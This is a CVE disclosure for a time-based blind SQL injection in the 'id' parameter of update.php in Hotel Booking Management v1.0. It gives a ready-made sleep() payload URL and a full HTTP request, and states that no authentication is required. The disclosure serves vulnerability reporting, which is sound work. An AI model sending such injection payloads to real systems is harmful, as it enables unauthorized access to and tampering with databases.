# CVE-2023-49989
# Hotel Booking Management v1.0 - SQL Injection Vulnerability in the "id" parameter at update.php

**Description**: Hotel Booking Management v1.0 was discovered to contain a SQL injection vulnerability via the id parameter at update.php.  
  
**Vulnerable Product Version**: Hotel Booking Management v1.0  
**CVE Author**: Geraldo Alcântara  
**Date**: 28/11/2023  
**Confirmed on**: 19/12/2023  
**CVE**: CVE-2023-49989     
**Tested on**: Windows  
### Steps to reproduce:  
To exploit the vulnerability, an attacker only needs to send the SQL injection payload to update.php through the vulnerable 'id' parameter. No authentication is required. http://{{IP}}/HotelBookingManagement-main/update.php?id=1%20and%20(select*from(select(sleep(20)))a)--%20
### Request:  
```
GET /HotelBookingManagement-main/update.php?id=1%20and%20(select*from(select(sleep(5)))a)--%20 HTTP/1.1
Host: 192.168.68.148
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Cache-Control: max-age=0
```
Discoverer(s)/Credits:  
Geraldo Alcântara
